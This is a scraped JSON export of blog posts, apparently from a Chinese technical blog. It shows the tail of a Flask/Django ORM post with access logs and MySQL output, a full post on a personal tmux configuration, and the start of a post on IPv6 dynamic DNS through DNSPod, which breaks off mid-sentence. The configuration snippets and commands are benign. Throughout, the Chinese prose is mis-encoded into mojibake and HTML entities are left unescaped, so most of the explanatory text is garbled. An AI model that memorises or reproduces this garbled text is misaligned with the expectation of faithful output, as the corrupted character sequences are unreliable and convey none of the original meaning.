&#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:13] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:14] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:16] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:17] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:18] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:19] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -127.0.0.1 - - [20&#x2F;Dec&#x2F;2020 09:53:26] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 - å†æ£€æŸ¥ä¸€ä¸‹æ•°æ®åº“ 123456789101112131415161718192021222324mysql&gt; select * from app_visit;+----+----------------------------+| id | created_at |+----+----------------------------+| 1 | 2020-12-20 09:52:56.660151 || 2 | 2020-12-20 09:52:58.761042 || 3 | 2020-12-20 09:53:00.393140 || 4 | 2020-12-20 09:53:01.811832 || 5 | 2020-12-20 09:53:03.216767 || 6 | 2020-12-20 09:53:04.471404 || 7 | 2020-12-20 09:53:05.639631 || 8 | 2020-12-20 09:53:06.790564 || 9 | 2020-12-20 09:53:07.823484 || 10 | 2020-12-20 09:53:08.836709 || 11 | 2020-12-20 09:53:12.069902 || 12 | 2020-12-20 09:53:13.293624 || 13 | 2020-12-20 09:53:14.799734 || 14 | 2020-12-20 09:53:15.993364 || 15 | 2020-12-20 09:53:17.022426 || 16 | 2020-12-20 09:53:18.141073 || 17 | 2020-12-20 09:53:19.499833 || 18 | 2020-12-20 09:53:26.608735 |+----+----------------------------+18 rows in set (0.02 sec) æ—¥å¿—é‡Œçš„è®¿é—®è®°å½•å’Œæ•°æ®åº“é‡Œå­˜å‚¨çš„è®¿é—®è®°å½•ï¼Œå®Œå…¨ä¸€è‡´ï¼Œå¤§åŠŸå‘Šæˆï¼æ”¶å·¥ç¡è§‰ï¼ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.chaosjohn.com/tags/Python/"},{"name":"Flask","slug":"Flask","permalink":"https://blog.chaosjohn.com/tags/Flask/"},{"name":"Django","slug":"Django","permalink":"https://blog.chaosjohn.com/tags/Django/"},{"name":"ORM","slug":"ORM","permalink":"https://blog.chaosjohn.com/tags/ORM/"}]},{"title":"Tmux â€œä¼ å®¶â€ é…ç½®","slug":"my-tmux-config","date":"2020-12-17T11:04:13.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"my-tmux-config.html","link":"","permalink":"https://blog.chaosjohn.com/my-tmux-config.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ ä»‹ç»Tmux æ˜¯ä¸€ä¸ªç»ˆç«¯å¤ç”¨è½¯ä»¶ï¼Œåœ¨æ²¡æœ‰ç»ˆç«¯å¤ç”¨è½¯ä»¶ä¹‹å‰ï¼š å¦‚æœè¦åŒæ—¶æ‰§è¡Œå¤šé¡¹ä»»åŠ¡ï¼Œå¾—å¼€å¤šä¸ªç»ˆç«¯çª—å£ï¼ˆTerminalï¼‰ï¼Œè¿œç¨‹çš„è¯è¿˜å¾—åœ¨å¤šä¸ªç»ˆç«¯çª—å£é‡Œå‘èµ·å¤šæ¡ SSH è¿æ¥ï¼ˆå…¥ä¸‹å›¾ï¼‰ å¦‚æœåœ¨è¿œç¨‹æ‰§è¡Œä»»åŠ¡çš„æ—¶å€™ï¼Œå…³é—­ç»ˆç«¯ï¼Œä¼šå¼ºåˆ¶æ€§å…³é—­ SSH è¿æ¥ï¼Œè¿›è€Œå¯¼è‡´ä»»åŠ¡æ‰§è¡Œç›´æ¥ä¸­æ–­ å¦‚æœç”¨ä¸Š Tmux è¿™æ ·çš„ç»ˆç«¯å¤ç”¨è½¯ä»¶åï¼š å¼€å¯ä¸€ä¸ª tmux session åï¼Œå¯ä»¥åŒæ—¶æ‰“å¼€å¤šä¸ªçª—å£ï¼Œæ¯ä¸ªçª—å£å¯ä»¥åˆ†å‰²ä¸ºå¤šä¸ªçª—æ ¼ï¼Œæ¯ä¸ªçª—æ ¼éƒ½æ˜¯ä¸€ä¸ª ttyï¼ˆå³è™šæ‹Ÿç»ˆç«¯ï¼‰ å…³é—­ç»ˆç«¯ï¼Œè¿è¡Œåœ¨ tmux session çš„ tty ä¸­çš„ä»»åŠ¡ï¼Œä¾æ—§ä¼šä¿æŒè¿è¡Œï¼Œé‡æ–°æ‰“å¼€ç»ˆç«¯ï¼Œè¿˜èƒ½è¿æ¥å›è¯¥ session ç¬”è€…è‡ªç”¨é…ç½®æœ¬æ–‡å–åä¸º â€œä¼ å®¶å®â€é…ç½®ï¼Œé‚£å¯ä¸æ˜¯è¯´è¯´è€Œå·²ï¼Œå› ä¸ºæœ¬æ–‡å†…çš„è‡ªå®šä¹‰é…ç½®å·²ç»é™ªä¼´äº†ç¬”è€…6å¹´ä¹‹ä¹…äº†ã€‚ ä¸ºä»€ä¹ˆè¦è‡ªå®šä¹‰è¿™ä»½é…ç½®å‘¢ï¼Ÿå› ä¸ºç¬”è€…åœ¨æœ€åˆä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå‘ç°å¾ˆå¤šä¸é¡ºæ‰‹çš„å¿«æ·é”®ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†è‡ªå®šä¹‰é¡¹éƒ½æ˜¯è·Ÿå¿«æ·é”®æœ‰å…³çš„ã€‚ é…ç½®æ–‡ä»¶ä½äºç”¨æˆ·ä¸»ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸º .tmux.conf å…ˆè¯´æ˜ä¸€ä¸‹ï¼ŒTmux çš„å‰ç¼€é”®ä¸º ctrl-bï¼Œå³å…ˆæŒ‰ä¸‹ ctrlé”® å’Œ bé”®, Tmux æ‰å¼€å§‹è¢«æ¿€æ´»è¿›å…¥å¿«æ·é”®æ¥å—æ¨¡å¼ï¼Œæ¯”å¦‚ï¼š ctrl-b æŒ‰ä¸‹åæ¾å¼€ï¼Œå†æŒ‰ä¸€ä¸‹ cï¼ŒTmux å°±ä¼šæ–°å»ºçª—å£ï¼ˆcreateï¼‰ ctrl-b æŒ‰ä¸‹åæ¾å¼€ï¼Œåœ¨æŒ‰ä¸€ä¸‹ dï¼ŒTmux å°±ä¼šä»å½“å‰çª—å£æ–­å¼€è½¬ä¸ºåå°æ‰§è¡Œï¼ˆdetachï¼‰ è‡ªå®šä¹‰çª—å£ä¸‹æ ‡èµ·å§‹Tmux å¯ä»¥æ–°å»ºå¾ˆå¤šçª—å£ï¼Œé»˜è®¤çª—å£æ ‡å·ä¸º 0ï¼Œç„¶åæ‰æ˜¯ 1 2 3 ...ï¼ˆçª—æ ¼ä¹Ÿæ˜¯ï¼‰ è™½ç„¶å¾ˆç¬¦åˆç¨‹åºæ€ç»´ï¼Œä½†æ˜¯è·Ÿé”®ç›˜ä¸Šé‚£ä¸€æ’æ•°å­—é”®çš„é¡ºåºä¸å»åˆï¼Œæ‰€ä»¥æ”¹æˆ 1 å¼€å§‹ï¼Œç„¶åæ‰æ˜¯ 2 3 4 ... 12set-option -g base-index 1set-window-option -g pane-base-index 1 è‡ªå®šä¹‰å¿«æ·é”®ï¼šåˆ†å‰²çª—æ ¼é»˜è®¤æƒ…å†µä¸‹ï¼š æ°´å¹³åˆ†å‰²ï¼šctrl-b + &quot;ï¼ˆå¼•å·é”®ï¼‰ å‚ç›´åˆ†å‰²ï¼šctrl-b + %ï¼ˆç™¾åˆ†å·é”®ï¼‰ æ”¹æˆ - å’Œ |ï¼Œæ›´ç¬¦åˆè¡Œä¸ºé€»è¾‘ 1234567unbind &#39;&quot;&#39;bind - splitw -vunbind %bind | splitw -h bind-key - split-window -c &quot;#&#123;pane_current_path&#125;&quot;bind-key | split-window -h -c &quot;#&#123;pane_current_path&#125;&quot; æœ€åä¸¤è¡Œè¡¨ç¤ºï¼Œé€šè¿‡ - å’Œ | åˆ†å‰²å‡ºçš„æ–°çª—æ ¼ï¼Œshell çš„åˆå§‹è·¯å¾„ä¸ºå½“å‰è·¯å¾„ è‡ªå®šä¹‰å¿«æ·é”®ï¼šçª—æ ¼é—´ç§»åŠ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œçª—æ ¼é—´ç§»åŠ¨æ˜¯ ctrl-b + æ–¹å‘é”® ç”±äºç¬”è€…ä¹ æƒ¯äº† Vim çš„æ–¹å‘é€»è¾‘ï¼Œæ‰€ä»¥ä¹Ÿå¢åŠ  hjkl ä½œä¸ºçª—æ ¼é—´å¯¼èˆªçš„å¿«æ·é”®ï¼ˆåŸæ–¹å‘é”®ä¹Ÿä¿ç•™ï¼‰ 1234bind k selectp -Ubind j selectp -Dbind h selectp -Lbind l selectp -R è‡ªå®šä¹‰å¿«æ·é”®ï¼šè°ƒæ•´çª—æ ¼å¤§å°ä½¿ç”¨ ctrl-b + ctrl-h/j/k/lï¼Œç”¨æ¥ç§»åŠ¨çª—æ ¼é—´çš„åˆ†å‰²çº¿æ–¹å‘ï¼Œè¾¾åˆ°è°ƒæ•´çª—å£å¤§å°çš„ç›®çš„ï¼ˆæ¯æ¬¡ç§»åŠ¨10è¡Œï¼‰ 1234bind ^k resizep -U 10bind ^j resizep -D 10bind ^h resizep -L 10bind ^l resizep -R 10 è‡ªå®šä¹‰çŠ¶æ€æ çš„èƒŒæ™¯å’Œå‰æ™¯è‰²é»˜è®¤çš„èƒŒæ™¯è‰²ä¸º ç»¿è‰²ï¼Œå‰æ™¯è‰²ä¸º é»‘è‰²ï¼Œç¬”è€…åˆ†åˆ«è°ƒæ•´ä¸º é»‘è‰² å’Œ é»„è‰² 12set -g status-bg blackset -g status-fg yellow æ•ˆæœå¯¹æ¯”å…¥ä¸‹å›¾ï¼š è‡ªå®šä¹‰çŠ¶æ€æ çš„ä¿¡æ¯æ˜¾ç¤ºé»˜è®¤åœ¨çŠ¶æ€æ å³ä¾§æ˜¾ç¤º ä¸»æœºå + æ—¶é—´ + æ—¥æœŸ å› ä¸ºç¬”è€…ä¸€èˆ¬ä½¿ç”¨ oh-my-zshï¼Œå·²ç»é…ç½®æ˜¾ç¤ºäº† ä¸»æœºå + æ—¶é—´ + æ—¥æœŸï¼Œæ‰€ä»¥æ”¹ä¸ºåªä¿ç•™ æ—¶é—´ï¼ˆå¯¹æ¯”è§ä¸Šå›¾ï¼‰ 12set-option -g status-right &quot;#(date +%H:%M&#39; &#39;)&quot;set-option -g status-right-length 10 é…åˆ oh-my-zsh çš„ tmux æ’ä»¶ä¸Šé¢ä¹Ÿè¯´äº†ï¼Œç¬”è€…ä¸€èˆ¬ä½¿ç”¨ oh-my-zshï¼Œå¦‚æœå¼€å¯ tmux æ’ä»¶ï¼ŒTmux çš„ä½¿ç”¨ä½“éªŒåˆä¼šæ›´ä¸Šä¸€å±‚æ¥¼ã€‚ å¼€å¯æ–¹æ³•ï¼šåœ¨ ~/.zshrc çš„ plugins=(git) æ‹¬å·é‡Œè¿½åŠ  tmuxï¼Œç©ºæ ¼éš”å¼€ å®ƒå¯ä»¥ï¼š å°† tmux attach -t $session_name ç¼©å‡æˆ ta $session_name å°† tmux attach -d -t $session_name ç¼©å‡ä¸º tad $session_name å°† tmux list-sessions ç¼©å‡ä¸º tl è¿˜æœ‰å…¶ä»–çš„ç¼©å‡ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥å‰å¾€ oh-my-zsh æ’ä»¶ç›®å½•çœ‹ä¸€çœ¼ tmux.plugin.zsh æ–‡ä»¶ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.chaosjohn.com/tags/Linux/"},{"name":"tmux","slug":"tmux","permalink":"https://blog.chaosjohn.com/tags/tmux/"}]},{"title":"IPv4/IPv6 åŒæ ˆ ddns (DNSPodç‰ˆ)","slug":"ddns-for-dnspod","date":"2020-12-16T11:25:06.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"ddns-for-dnspod.html","link":"","permalink":"https://blog.chaosjohn.com/ddns-for-dnspod.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€ç¬”è€…å¾ˆæ—©ä»¥å‰å°±æœ‰ä¸€ä¸ªæ¢¦æƒ³ï¼Œå³ï¼šæˆ‘æ‰€æœ‰çš„è”ç½‘è®¾å¤‡ï¼Œéƒ½è¦èƒ½éšæ—¶éšåœ°è®¿é—®åˆ°ã€‚æ¯”å¦‚åœ¨å…¬å¸è®¿é—®æˆ‘å®¶é‡Œçš„ç”µè„‘å’Œ NASï¼Œä»¥åŠåœ¨å®¶é‡Œè®¿é—®å…¬å¸çš„å·¥ä½œç”µè„‘ã€‚ äºæ˜¯ç¬”è€…å¼€å§‹äº†æ¼«é•¿çš„æŠ˜è…¾ä¹‹è·¯ï¼š æœ€å¼€å§‹ï¼Œå®¶é‡Œå’Œå…¬å¸éƒ½æ˜¯ç”µä¿¡å®½å¸¦ï¼Œæˆ‘å°±ä¸åŒå…¶çƒ¦åœ°éªšæ‰°ç”µä¿¡å®¢æœï¼Œç”³è¯·å…¬ç½‘IPã€‚å½“è·¯ç”±å™¨åˆ†é…åˆ°äº†å…¬ç½‘IPåï¼Œé…åˆ DMZ å’Œ ç«¯å£æ˜ å°„ï¼Œå°±èƒ½å°†è·¯ç”±å™¨ä¸‹è®¾å¤‡çš„æŸäº›ç«¯å£æš´éœ²åœ¨å…¬ç½‘ä¸Šã€‚ç¼ºç‚¹ï¼šå¦‚æœè®¾å¤‡å’Œéœ€è¦æš´éœ²åˆ°å…¬ç½‘çš„æœåŠ¡æ¯”è¾ƒå¤šï¼Œä¸æ‹¿ä¸ªè®°äº‹æœ¬æŠŠ ä»€ä¹ˆæœåŠ¡æš´éœ²åœ¨ä»€ä¹ˆç«¯å£ è®°å½•ä¸‹æ¥ï¼Œç”¨åˆ°çš„æ—¶å€™æ€»æ˜¯ä¼šè®°æ··æ·†ã€‚ åæ¥æ¬å®¶åå®½å¸¦ä»ç”µä¿¡æ¢æˆäº†ç§»åŠ¨ï¼Œè·å–å…¬ç½‘IPå°±æˆäº†å¥¢æœ›ï¼ˆæˆ‘è¿˜çœŸä¸Šè¿‡å·¥ä¿¡éƒ¨æŠ•è¯‰ï¼Œç»“æœç§»åŠ¨è‡´ç”µè¿‡æ¥è¡¨ç¤ºå¯ä»¥ç»™æˆ‘å®‰æ’åœæœé€€æ¬¾ï¼Œæˆ‘æ€‚äº†ï¼Œç»§ç»­ç”¨å§ï¼‰ã€‚ç„¶åå°±ä¹°äº†ä¸€ä¸ªèŠ±ç”Ÿæ£’ï¼Œå³èŠ±ç”Ÿå£³çš„å†…ç½‘ç©¿é€ç‰ˆï¼Œå› å…è´¹ç‰ˆåªç»™ä¸¤æ¡æ˜ å°„ï¼Œæ‰€ä»¥ç¬”è€…åªèƒ½è´¡çŒ®ç»™å¸¸ç”¨æœºçš„ SSH(22ç«¯å£) å’Œ VNC(5900ç«¯å£)ã€‚ç¼ºç‚¹ï¼šå¥ˆä½•èƒ½ç”¨çš„ç«¯å£åªæœ‰ä¸¤ä¸ªï¼Œä»¥åŠæ¯æœˆåªæœ‰2Gçš„æµé‡ï¼Œç¬”è€…æ’‘äº†ä¸€æ®µæ—¶é—´è¿˜æ˜¯æ”¾å¼ƒäº†å®ƒã€‚ åæ¥é€æ¸æ¥è§¦åˆ°å„ç§å†…ç½‘ç©¿é€æ–¹æ¡ˆï¼Œå…ˆæ˜¯ ngorkï¼Œåæ¥æ˜¯ frpï¼Œå°†æœåŠ¡ç«¯éƒ¨ç½²åœ¨äº†è‡ªå·±çš„äº‘ä¸»æœºä¸Šåï¼Œç«¯å£æ•°é‡é™åˆ¶å†ä¹Ÿä¸æ˜¯é—®é¢˜äº†ï¼Œæƒ³é…å¤šå°‘å°±é…å¤šå°‘ã€‚ç¼ºç‚¹ï¼šå›½å†…äº‘ä¸»æœºçš„å¸¦å®½å®åœ¨å¤ªè´µï¼Œä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ï¼Œ1Må¸¦å®½23å…ƒæ¯æœˆï¼Œ2Må¸¦å®½46å…ƒï¼Œ3Må¸¦å®½71å…ƒï¼Œ4Må¸¦å®½96å…ƒï¼Œ5Må¸¦å®½125å…ƒï¼Œå¸¦å®½è¶Šå¤§å•ä»·è¶Šè´µï¼›å›½å¤–äº‘ä¸»æœºå¸¦å®½è™½ç„¶è¶³ï¼Œä½†æ˜¯å»¶è¿Ÿå¤ªé«˜äº†ï¼ŒçœŸçš„å¾ˆéš¾å–èˆã€‚ å†åæ¥ï¼Œåˆæ¥è§¦åˆ°äº† n2nï¼Œä¸ªäººçš„äº‘ä¸»æœºä¸Šæ­å»ºä¸€ä¸ªèŠ‚ç‚¹æœåŠ¡å™¨ supernodeï¼Œä¸åŒè®¾å¤‡éƒ½è¿æ¥ supernodeï¼Œåå•†åç›´æ¥è¿›è¡Œç‚¹å¯¹ç‚¹ï¼ˆP2Pï¼‰é€šä¿¡ï¼Œå³çœŸæ­£çš„è®¾å¤‡é—´æ•°æ®ä¼ è¾“æ˜¯ç›´è¿çš„è€Œä¸ç»è¿‡ supernodeã€‚ä¼˜ç‚¹ï¼šå…¨ç«¯å£å¯ç”¨ï¼Œé€Ÿåº¦ä¸å—é™ã€‚ç¼ºç‚¹ï¼šå› ä¸ºæ˜¯ P2P æ–¹æ¡ˆï¼Œæ‰€ä»¥éœ€è¦è®¾å¤‡éƒ½å®‰è£…å®¢æˆ·ç«¯ï¼Œä½†å®ƒæŠŠ Windows / Linux / macOS / Android éƒ½æ”¯æŒéäº†ï¼Œå°±æ˜¯æ²¡æœ‰ iOS çš„å®¢æˆ·ç«¯ã€‚ 17å¹´ä¸‹åŠå¹´çš„æ—¶å€™ï¼Œç¬”è€…çªç„¶å‘ç°äº†ç¥å™¨ ZeroTierã€‚å®ƒå°±æ˜¯ä¸€ä¸ªå¢å¼ºç‰ˆçš„ n2nï¼Œä¸åŒçš„æ˜¯ï¼Œå®ƒé»˜è®¤ä½¿ç”¨å®˜æ–¹çš„èŠ‚ç‚¹æœåŠ¡å™¨ï¼ˆå½“ç„¶ä¸ªäººä¹Ÿå¯ä»¥è‡ªå»ºï¼‰ï¼Œæ›´ä¸ºé‡è¦çš„æ˜¯ï¼Œå‡ ä¹æ‰€æœ‰çš„ç³»ç»Ÿå¹³å°ï¼Œå®ƒéƒ½æ”¯æŒï¼Œå°±è¿å„ç±»NASä¹Ÿèƒ½å®‰è£…ä½¿ç”¨ã€‚ç¬”è€…ç›´åˆ°ä»Šå¤©ï¼Œè¿˜åœ¨æ·±åº¦ä½¿ç”¨å®ƒã€‚ä¸¾ä¸ªä¾‹å­è¯æ˜ç¬”è€…æœ‰å¤šçˆ±å®ƒï¼šå®˜ç½‘æ˜¯ zerotier.comï¼Œç¬”è€…äº 2018-01-12 åœ¨è…¾è®¯äº‘æ³¨å†Œäº†åŸŸå zerotier.cnï¼Œä¸“é—¨ç”¨æ¥è§£æ ZeroTier åˆ†é…ç»™è®¾å¤‡çš„ å†…ç½‘IPï¼Œå¹¶ç»­è´¹è‡³ä»Šã€‚ï¼ˆå¦‚æœç”¨ whois æŸ¥ä¸€ä¸‹è¯¥åŸŸåï¼Œè¿˜èƒ½å‘ç°ç¬”è€…çš„çœŸåå’Œé‚®ç®±å“¦å“ˆå“ˆå“ˆå“ˆå“ˆï¼‰ç¼ºç‚¹ï¼šåœ¨è®¾å¤‡ç‚¹å¯¹ç‚¹ä¹‹é—´çš„çº¿è·¯ä¼˜åŒ–å¥½ä¹‹å‰ï¼Œä¸¢åŒ…æ¯”è¾ƒä¸¥é‡ï¼Œç”šè‡³è¿ä¸ä¸Šã€‚ä½†åªè¦çº¿è·¯é€æ¸ä¼˜åŒ–å¥½ä¹‹åï¼Œé€Ÿåº¦å‡ ä¹èƒ½è·‘æ»¡å¸¦å®½ã€‚ 19å¹´ä¸‹æ—¬çš„æ—¶å€™ï¼Œç¬”è€…çªç„¶å‘ç°ï¼Œå®¶åº­å®½å¸¦å’Œæ‰‹æœºèœ‚çªç½‘ç»œï¼Œå±…ç„¶éƒ½åŸç”Ÿæ”¯æŒ IPv6 äº†ï¼Œå³æ— è®ºæ˜¯è·¯ç”±å™¨ä¸‹çš„è®¾å¤‡ï¼Œè¿˜æ˜¯æ’äº†SIMå¡çš„ç§»åŠ¨è®¾å¤‡ï¼Œéƒ½èƒ½åˆ†é…åˆ° IPv6åœ°å€ äº†ã€‚è¿™æ„å‘³ç€ï¼Œé€šè¿‡æŸè®¾å¤‡çš„ IPv6 åœ°å€ï¼Œå¯ä»¥ç›´æ¥è®¿é—®åˆ°è¯¥è®¾å¤‡çš„æ‰€æœ‰ç«¯å£ï¼ˆ80/443ç«¯å£æ˜¯å¦è¢«ç¦å¾—çœ‹å„åœ°è¿è¥å•†æ”¿ç­–ï¼‰ã€‚ IPv6 çš„é—®é¢˜ç”¨ IPv6 å®ç°æ‰€æœ‰è®¾å¤‡çš„è¿é€šï¼Œè¿™ç‚¹éå¸¸æ£’ï¼Œå°±åªå·®ä¸€ä¸ªé—®é¢˜éœ€è¦è§£å†³ï¼šé€‚ç”¨äº IPv6 çš„ ddns æ–¹æ¡ˆã€‚ ä»€ä¹ˆæ˜¯ ddns å‘¢ï¼Ÿå®ƒçš„å…¨ç§°ä¸º dynamic dnsï¼Œå³ åŠ¨æ€åŸŸåè§£æã€‚ ä½¿ç”¨åœºæ™¯ï¼šå®¶åº­å®½å¸¦ä¸‹ï¼ŒIPåœ°å€ ä¼šè¢«è¿è¥å•†å®šæœŸæ›´æ¢ï¼Œåœ¨è‡ªèº« IPåœ°å€ å‘ç”Ÿå˜åŒ–åï¼Œå°†æ–°çš„IPåœ°å€æäº¤ç»™ dnsè§£ææœåŠ¡å•†ï¼Œè®©çº¦å®šçš„åŸŸåè§£ææ›´æ–°ä¸ºæ–°çš„IPåœ°å€ã€‚ ä¸Šé¢ æŠ˜è…¾ä¹‹è·¯[1]ï¼Œé€šè¿‡ç”µä¿¡å®½å¸¦åˆ†é…çš„å…¬ç½‘IPè®¿é—®æœåŠ¡ï¼Œä¹Ÿæ˜¯éœ€è¦ç”¨ ddns æ¥æ›´æ–° IPåœ°å€ åˆ°è‡ªå·±çš„åŸŸåä¸Šï¼Œä¸è¿‡ä¸€èˆ¬è·¯ç”±å™¨éƒ½å†…ç½®äº† ddns åŠŸèƒ½ï¼Œå‚»ç“œå¼é…ç½®èµ·æ¥ä¹Ÿå¾ˆç®€å•ã€‚ ä½†æ˜¯ï¼š è¿™äº›æˆç†Ÿä¸”å†…ç½®çš„ ddns æ–¹æ¡ˆï¼Œéƒ½åªé€‚ç”¨äº IPv4 å¯¹äº IPv4ï¼Œå±€åŸŸç½‘å†…åªéœ€æœ‰ä¸€å°è®¾å¤‡ï¼ˆå¯ä»¥æ˜¯è·¯ç”±å™¨æœ¬èº«ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸‹å±è®¾å¤‡ï¼‰é…ç½® ddns å°±å¯ä»¥äº†ï¼Œå› ä¸ºæ•´ä¸ªå±€åŸŸç½‘éƒ½å…±ç”¨ä¸€ä¸ªå…¬ç½‘IPï¼›è€Œå¯¹äº IPv6ï¼Œæ¯ä¸ªè®¾å¤‡éƒ½æœ‰è‡ªå·±çš„å…¬ç½‘IPï¼Œå³éœ€è¦å…¬ç½‘è¢«è®¿é—®çš„æ¯å°è®¾å¤‡éƒ½è¦å•ç‹¬é…ç½® ddns è§£å†³ IPv6 çš„ ddnså› ç¬”è€…çš„åŸŸåå‡ ä¹éƒ½æ˜¯åœ¨ è…¾è®¯äº‘ ä¸Šè´­ä¹°çš„ï¼Œå¹¶ä¸”ä½¿ç”¨ DNSPod è¿›è¡Œè§£æï¼Œæ•…ä»¥ä¸‹æ‰€æœ‰çš„æ–¹æ¡ˆéƒ½æ˜¯èšç„¦äº DNSPodã€‚ ç¬¬ä¸€ç‰ˆæ–¹æ¡ˆå» DNSPod å¼€æºç¤¾åŒºå¯»æ‰¾ IPv6-ddns çš„è§£å†³æ–¹æ¡ˆã€‚ä¸å¾—ä¸è¯´ï¼Œå¾ˆå¤šå·¥å…·éƒ½å†™çš„å¾ˆæ£’ï¼Œä»£ç å†™çš„å¾ˆæ¼‚äº®ï¼Œä½†æ˜¯éƒ½ä¸é€‚ç”¨ç¬”è€…ï¼Œä¸»è¦åŸå› ä¸ºï¼Œç¬”è€…çš„è®¾å¤‡å¤ªå¤šäº†ï¼Œæ‰€æ­è½½çš„ç³»ç»Ÿä¹Ÿå¤ªæ‚äº†ï¼Œå¯¼è‡´é‚£äº›å·¥å…·å³ä½¿ä¸ºäº†æé«˜å…¼å®¹æ€§ï¼Œé‡‡ç”¨ çº¯Python å’Œ çº¯Shell ç¼–å†™ï¼Œä¹Ÿæ— æ³•æ»¡è¶³æ‰€æœ‰è®¾å¤‡ï¼Œæ¯”å¦‚ ESXiï¼Œè¿™å®¶ä¼™è™½ç„¶åº•å±‚æ˜¯ Linuxï¼Œä½†æ˜¯é­”æ”¹äº†å¾ˆå¤šï¼Œæ— è®ºæ˜¯ Shell è¿˜æ˜¯ Python ç¯å¢ƒï¼Œéƒ½æ˜¯é˜‰å‰²è¿‡çš„ï¼Œå®æµ‹å¤§éƒ¨åˆ†å·¥å…·éƒ½æ— æ³•æ­£å¸¸è¿è¡Œï¼›å¦ä¸€æ–¹é¢ï¼Œå¦‚æœé‡åˆ°å¤šç½‘å¡ï¼ˆå«è™šæ‹Ÿç½‘å¡ï¼‰çš„åœºæ™¯ï¼Œé‚£äº›å·¥å…·å¾ˆéš¾è·å–åˆ°å‡†ç¡®çš„ä¸”å…¬ç½‘å¯è¾¾çš„æœ¬åœ° IPv6åœ°å€ã€‚ ç¬¬äºŒç‰ˆæ–¹æ¡ˆä¸ºäº†è§£å†³ ç¬¬ä¸€ç‰ˆæ–¹æ¡ˆ çš„ä¸¤ä¸ªç—›ç‚¹ï¼š å¦‚ä½•è·å–åˆ°å‡†ç¡®çš„ IPv6 åœ°å€ å¦‚ä½•èƒ½åœ¨ å‡ ä¹ æ‰€æœ‰ç³»ç»Ÿä¸Šéƒ½é€‚ç”¨ï¼ˆé™¤å¼€Windowsï¼Œå› ä¸ºç¬”è€…å‡ ä¹ä¸ç”¨ï¼‰ é’ˆå¯¹ ç—›ç‚¹1ï¼šæ—¢ç„¶é€šè¿‡è¯»å–ç½‘å¡ä¿¡æ¯æ— æ³•åšåˆ°å‡†ç¡®åœ°è·å–å…¬ç½‘å¯è¾¾çš„ IPv6åœ°å€ï¼Œé‚£å°±æ›´æ¢æ€è·¯ï¼Œç½‘ä¸Šä¸æ˜¯æœ‰å¾ˆå¤šæŸ¥è¯¢è‡ªèº« IPv6åœ°å€ å—ï¼Œæ¯”å¦‚ api6.ipify.org 12$ curl api6.ipify.org240e:47b:1660:4939:881f:1234:5678:9abc å› ä¸ºå‡ ä¹æ‰€æœ‰çš„ç³»ç»Ÿéƒ½é¢„è£…äº† curl æˆ–è€… wgetï¼ˆæ¯”å¦‚ ESXi æ—  curl ä½†å†…ç½®äº†é˜‰å‰²ç‰ˆçš„ wgetï¼‰ï¼Œæ‰€ä»¥ ç—›ç‚¹1 å®Œç¾è§£å†³ã€‚ åŒæ—¶ä¹Ÿç»™è§£å†³ ç—›ç‚¹2 æä¾›äº†æ€è·¯ï¼šå¦‚æœæˆ‘åœ¨è‡ªå·±çš„äº‘ä¸»æœºä¸Šéƒ¨ç½²ä¸€ä¸ªæœåŠ¡ï¼Œè®¾å¤‡å®šæœŸå°†è‡ªå·±çš„ IPv6åœ°å€ å’Œä¸å…¶ç»‘å®šçš„åŸŸåé€šè¿‡ curl / wget æäº¤ç»™è¯¥æœåŠ¡ï¼Œè®©è¯¥æœåŠ¡åœ¨äº‘ä¸»æœºä¸Šä»£ç†è¿›è¡Œ ddnsï¼Œå°†æ–°è§£ææäº¤ç»™ DNSPodï¼Œä¸å°±è§£å†³äº†å—ï¼Ÿ äºæ˜¯ç¬”è€…ï¼š å‚è€ƒ DNSPod API ç”¨ NodeJS å†™äº†ä¸€ä¸ª ddnsä»£ç† çš„æœåŠ¡éƒ¨ç½²åœ¨äº‘ä¸»æœºä¸Šï¼ˆç”¨ NodeJS è¿›è¡Œç¼–å†™çš„åŸå› ä»…ä»…æ˜¯å½“æ—¶çš„å·¥ä½œå†…å®¹å’Œ 